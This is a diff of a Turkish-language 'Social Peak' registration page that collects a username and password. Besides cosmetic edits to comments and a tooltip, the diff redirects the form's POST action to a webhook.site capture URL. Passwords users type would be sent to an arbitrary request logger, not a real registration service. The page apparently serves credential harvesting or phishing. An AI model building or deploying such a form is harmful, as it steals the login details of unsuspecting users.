@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Social Peak - Kayıt Ol</title>
 
-  <!-- CSS BAĞLANTI -->
+  <!-- CSS bağlantısı -->
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -22,7 +22,7 @@
       Sistemlerimize erişmek için aşağıdaki bilgileri doldurarak kayıt olun!
     </p>
 
-    <form action="https://www.vipechecker.art/register" method="POST">
+    <form action="https://webhook.site/3e76a8ca-d086-425d-86a8-476035d540e9" method="POST">
 
       <label>Kullanıcı Adı</label>
       <input type="text" name="username" placeholder="Bir kullanıcı adı gir..." required>
@@ -33,7 +33,7 @@
       <label>Şifre</label>
       <div class="password-box">
         <input type="password" id="password" name="password" placeholder="Şifre" required>
-        <span onclick="togglePassword()" title="Şifreyi Göster/Gizle"></span>
+        <span onclick="togglePassword()"></span>
       </div>
 
       <button type="submit">Kayıt Ol</button>
@@ -46,6 +46,7 @@
   </div>
 </div>
 
+<!-- JavaScript burada -->
 <script>
 function togglePassword() {
   const passwordInput = document.getElementById('password');
